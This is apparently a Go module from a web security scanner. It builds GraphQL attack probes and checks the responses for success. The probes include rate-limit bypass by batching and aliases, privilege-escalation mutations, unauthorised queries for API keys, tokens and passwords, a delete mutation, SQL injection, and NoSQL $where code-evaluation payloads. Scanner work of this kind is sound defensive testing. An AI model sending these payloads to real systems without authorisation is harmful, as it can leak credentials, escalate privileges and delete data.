package graphqlattack

import (
	"encoding/json"
	"fmt"
	"strings"
)

// Probe is a GraphQL abuse request body.
type Probe struct {
	Body   string
	Name   string
	Signal string
}

// BuildBatchProbe creates a batched GraphQL request to bypass rate limits.
func BuildBatchProbe(count int) Probe {
	if count <= 0 {
		count = 50
	}
	if count > 200 {
		count = 200
	}
	ops := make([]map[string]string, count)
	for i := 0; i < count; i++ {
		ops[i] = map[string]string{"query": fmt.Sprintf("{ __typename } #%d", i)}
	}
	raw, _ := json.Marshal(ops)
	return Probe{
		Body:   string(raw),
		Name:   "batch_abuse",
		Signal: "graphql_batch_accepted",
	}
}

// BuildSuggestionsProbe creates a query with a non-existent field to trigger field suggestions.
func BuildSuggestionsProbe(field string) Probe {
	field = sanitizeField(field)
	return Probe{
		Body:   fmt.Sprintf(`{"query":"{%s_nonexistent_field_xyz}"}`, field),
		Name:   "field_suggestions",
		Signal: "graphql_field_suggestions",
	}
}

// BuildTypeInversionProbes returns type-mutation probes for ORM/NoSQL confusion.
func BuildTypeInversionProbes(field string) []Probe {
	field = sanitizeField(field)
	return []Probe{
		{
			Body:   fmt.Sprintf(`{"query":"{%s(id: true) { id email } }"}`, field),
			Name:   "bool_id",
			Signal: "type_inversion_bool",
		},
		{
			Body:   fmt.Sprintf(`{"query":"{%s(id: [1,2,3]) { id email } }"}`, field),
			Name:   "array_id",
			Signal: "type_inversion_array",
		},
		{
			Body:   fmt.Sprintf(`{"query":"query($id: Int!) { %s(id: $id) { id email } }", "variables":{"id":[1,2,3]}}`, field),
			Name:   "variable_array",
			Signal: "type_inversion_variable",
		},
		{
			Body:   fmt.Sprintf(`{"query":"{%s(id: \"1 OR 1=1\") { id email } }"}`, field),
			Name:   "string_sqli_id",
			Signal: "type_inversion_string",
		},
	}
}

// BuildCircularDepthProbe tests if the GraphQL engine enforces query depth limits.
func BuildCircularDepthProbe(field string) Probe {
	field = sanitizeField(field)
	query := fmt.Sprintf(`{"query":"{ %s { %s { %s { %s { %s { id email } } } } } }"}`, field, field, field, field, field)
	return Probe{
		Body:   query,
		Name:   "query_depth_limit_bypass",
		Signal: "graphql_depth_unlimited",
	}
}

// BuildAliasOverloadProbe tests if single-request multi-alias execution is permitted (Rate Limit / Mass Bruteforce bypass).
func BuildAliasOverloadProbe(field string) Probe {
	field = sanitizeField(field)
	var sb strings.Builder
	sb.WriteString(`{"query":"{`)
	for i := 1; i <= 20; i++ {
		sb.WriteString(fmt.Sprintf(` a%d: %s(id: %d) { id email }`, i, field, i))
	}
	sb.WriteString(` }"}`)
	return Probe{
		Body:   sb.String(),
		Name:   "alias_overloading",
		Signal: "graphql_alias_overload",
	}
}

// BuildMutationPrivilegeProbe tests for GraphQL Mutation Mass Assignment / Privilege Escalation.
func BuildMutationPrivilegeProbe(field string) Probe {
	field = sanitizeField(field)
	query := fmt.Sprintf(`{"query":"mutation { update%s(id: 1, role: \"admin\", is_admin: true) { id role } }"}`, strings.Title(field))
	return Probe{
		Body:   query,
		Name:   "mutation_privilege_escalation",
		Signal: "graphql_mutation_privilege",
	}
}

// BuildAuthorizationBypassProbes returns probes that test for Broken Function Level Authorization (BFLA),
// unauthorized administrative queries, and field-level authorization bypasses.
func BuildAuthorizationBypassProbes(field string) []Probe {
	field = sanitizeField(field)
	return []Probe{
		{
			Body:   `{"query":"{ admin { id username email role permissions } }"}`,
			Name:   "graphql_admin_query_bfla",
			Signal: "graphql_auth_bypass_admin",
		},
		{
			Body:   `{"query":"{ users { id email role is_admin apiKey token } }"}`,
			Name:   "graphql_users_list_bfla",
			Signal: "graphql_auth_bypass_users",
		},
		{
			Body:   `{"query":"{ systemInfo { version debug env config database } }"}`,
			Name:   "graphql_system_info_bfla",
			Signal: "graphql_auth_bypass_system",
		},
		{
			Body:   fmt.Sprintf(`{"query":"{ %s(id: 1) { id email apiKey secretToken ssn password role isAdmin } }"}`, field),
			Name:   "graphql_field_level_auth",
			Signal: "graphql_field_auth_leak",
		},
		{
			Body:   fmt.Sprintf(`{"query":"mutation { delete%s(id: 1) { id success } }"}`, strings.Title(field)),
			Name:   "graphql_mutation_delete_bfla",
			Signal: "graphql_auth_bypass_mutation",
		},
	}
}

// BuildFilterWhereEvalProbes tests for in-memory MongoDB/Sift $where code execution and NoSQL operator evaluation.
func BuildFilterWhereEvalProbes(field string) []Probe {
	field = sanitizeField(field)
	return []Probe{
		{
			Body:   fmt.Sprintf(`{"query":"query($f:JSON){%s(filter:$f){id}}","variables":{"f":{"$where":"(function(){throw new Error(\"AKCA_GQL_\"+(97*103)+\"_EVAL\")})()"}}}`, field),
			Name:   "graphql_sift_where_math_eval",
			Signal: "graphql_filter_where_rce",
		},
		{
			Body:   fmt.Sprintf(`{"query":"{%s(filter:{ $where: \"(function(){throw new Error(\\\"AKCA_GQL_\\\"+(97*103)+\\\"_EVAL\\\")})()\" }){id}}"}`, field),
			Name:   "graphql_sift_where_inline",
			Signal: "graphql_filter_where_rce",
		},
		{
			Body:   fmt.Sprintf(`{"query":"query($f:JSON){%s(filter:$f){id}}","variables":{"f":{"$where":"(function(){throw new Error(\"AKCA_ENV_\"+(typeof process)))})()"}}}`, field),
			Name:   "graphql_sift_where_typeof_process",
			Signal: "graphql_filter_where_rce",
		},
		{
			Body:   fmt.Sprintf(`{"query":"query($f:JSON){%s(filter:$f){id}}","variables":{"f":{"$expr":{"$gt":["$id",0]}}}}`, field),
			Name:   "graphql_expr_operator",
			Signal: "graphql_nosql_operator",
		},
		{
			Body:   fmt.Sprintf(`{"query":"query($f:JSON){%s(filter:$f){id}}","variables":{"f":{"id":{"$regex":".*"}}}}`, field),
			Name:   "graphql_regex_operator",
			Signal: "graphql_nosql_operator",
		},
		{
			Body:   fmt.Sprintf(`{"query":"{%s @include(if: true) @skip(if: false) { id email } }"}`, field),
			Name:   "graphql_directive_overload",
			Signal: "graphql_directive_bypass",
		},
	}
}

// Analyze compares baseline and probe GraphQL responses.
func Analyze(baselineBody, probeBody string, probe Probe) (bool, string) {
	if probeBody == "" || probeBody == baselineBody {
		return false, ""
	}
	lower := strings.ToLower(probeBody)
	baseLower := strings.ToLower(baselineBody)

	// In-Memory Sift / MongoDB $where code execution proof (e.g. 97*103 = 9991)
	if strings.Contains(probeBody, "AKCA_GQL_9991_EVAL") || strings.Contains(probeBody, "AKCA_ENV_object") {
		return true, "graphql_filter_where_rce"
	}
	if strings.Contains(lower, "in csp mode, sift does not support strings") ||
		strings.Contains(lower, `in "$where" condition`) ||
		strings.Contains(lower, "cannot use $where") {
		return true, "graphql_sift_where_detected"
	}

	// Always check for GraphQL debug/tracing extension disclosure
	if strings.Contains(lower, `"extensions"`) && (strings.Contains(lower, `"tracing"`) || strings.Contains(lower, `"exception"`) || strings.Contains(lower, `"debug"`)) {
		return true, "graphql_tracing_extension_leak"
	}

	switch probe.Signal {
	case "graphql_filter_where_rce", "graphql_sift_where_detected":
		// Handled above via exact token/CSP check.
		return false, ""
	case "graphql_nosql_operator":
		if strings.Contains(lower, `"data"`) && !strings.Contains(lower, `"errors"`) {
			return true, probe.Signal
		}
	case "graphql_directive_bypass":
		if strings.Contains(lower, `"data"`) && !strings.Contains(lower, `"errors"`) {
			return true, probe.Signal
		}
	case "graphql_auth_bypass_admin", "graphql_auth_bypass_users", "graphql_auth_bypass_system", "graphql_auth_bypass_mutation":
		var resp struct {
			Data   map[string]interface{} `json:"data"`
			Errors []interface{}          `json:"errors"`
		}
		if err := json.Unmarshal([]byte(probeBody), &resp); err == nil && len(resp.Data) > 0 && len(resp.Errors) == 0 {
			dataRaw, _ := json.Marshal(resp.Data)
			dataLower := strings.ToLower(string(dataRaw))
			if dataLower != "null" && dataLower != "{}" && dataLower != "[]" {
				if !strings.Contains(dataLower, "unauthorized") && !strings.Contains(dataLower, "forbidden") && !strings.Contains(dataLower, "unauthenticated") {
					return true, probe.Signal
				}
			}
		}
	case "graphql_field_auth_leak":
		var resp struct {
			Data   map[string]interface{} `json:"data"`
			Errors []interface{}          `json:"errors"`
		}
		// In GraphQL, an authentic field-level authorization leak occurs when the sensitive field
		// is successfully resolved and populated inside the 'data' JSON tree, and NOT merely
		// mentioned in a validation/schema rejection error message.
		if err := json.Unmarshal([]byte(probeBody), &resp); err == nil && len(resp.Data) > 0 {
			dataRaw, _ := json.Marshal(resp.Data)
			dataLower := strings.ToLower(string(dataRaw))
			for _, kw := range []string{"apikey", "secrettoken", "ssn", "password", "token", "isadmin"} {
				if strings.Contains(dataLower, kw) && !strings.Contains(baseLower, kw) {
					// Verify that the field holds a non-null, non-empty value
					if !strings.Contains(dataLower, `"`+kw+`":null`) && !strings.Contains(dataLower, `"`+kw+`":""`) {
						return true, probe.Signal
					}
				}
			}
		}
	case "graphql_batch_accepted":
		var ops []map[string]interface{}
		if err := json.Unmarshal([]byte(probeBody), &ops); err == nil && len(ops) >= 5 {
			return true, probe.Signal
		}
		if strings.Count(probeBody, `"data"`) >= 5 || strings.Count(probeBody, `__typename`) >= 5 {
			return true, probe.Signal
		}
	case "graphql_field_suggestions":
		if (strings.Contains(lower, "did you mean") || strings.Contains(lower, "perhaps you meant")) &&
			!strings.Contains(baseLower, "did you mean") {
			return true, "field_suggestions_exposed"
		}
	case "graphql_depth_unlimited":
		var resp struct {
			Data   map[string]interface{} `json:"data"`
			Errors []interface{}          `json:"errors"`
		}
		if err := json.Unmarshal([]byte(probeBody), &resp); err == nil && len(resp.Data) > 0 && len(resp.Errors) == 0 {
			if !strings.Contains(lower, "depth limit") && !strings.Contains(lower, "too deep") && !strings.Contains(lower, "max depth") {
				return true, probe.Signal
			}
		}
	case "graphql_alias_overload":
		var resp struct {
			Data map[string]interface{} `json:"data"`
		}
		if err := json.Unmarshal([]byte(probeBody), &resp); err == nil && len(resp.Data) >= 5 {
			return true, probe.Signal
		}
	case "graphql_mutation_privilege":
		var resp struct {
			Data map[string]interface{} `json:"data"`
		}
		if err := json.Unmarshal([]byte(probeBody), &resp); err == nil && len(resp.Data) > 0 {
			dataRaw, _ := json.Marshal(resp.Data)
			dataLower := strings.ToLower(string(dataRaw))
			if strings.Contains(dataLower, `"role":"admin"`) || strings.Contains(dataLower, `"is_admin":true`) || strings.Contains(dataLower, `"isadmin":true`) {
				return true, probe.Signal
			}
		}
	case "type_inversion_bool", "type_inversion_array", "type_inversion_variable", "type_inversion_string":
		var resp struct {
			Data map[string]interface{} `json:"data"`
		}
		if err := json.Unmarshal([]byte(probeBody), &resp); err == nil && len(resp.Data) > 0 {
			dataRaw, _ := json.Marshal(resp.Data)
			dataLower := strings.ToLower(string(dataRaw))
			hasLeak := false
			for _, kw := range []string{"email", "password", "token", "secret", "admin", "credential", "session", "oauth"} {
				if strings.Contains(dataLower, kw) && !strings.Contains(baseLower, kw) {
					hasLeak = true
					break
				}
			}
			if len(probeBody) > len(baselineBody)*2 && hasLeak {
				return true, "type_inversion_data_leak"
			}
		}
		for _, kw := range []string{"cannot represent", "expected type", "int cannot", "validation error", "bad user input"} {
			if strings.Contains(lower, kw) && !strings.Contains(baseLower, kw) {
				return true, "type_inversion_error_disclosure"
			}
		}
	}
	return false, ""
}

func sanitizeField(field string) string {
	if field == "" || strings.EqualFold(field, "body") {
		return "user"
	}
	for _, ch := range field {
		if (ch < 'a' || ch > 'z') && (ch < 'A' || ch > 'Z') && (ch < '0' || ch > '9') && ch != '_' {
			return "user"
		}
	}
	return field
}
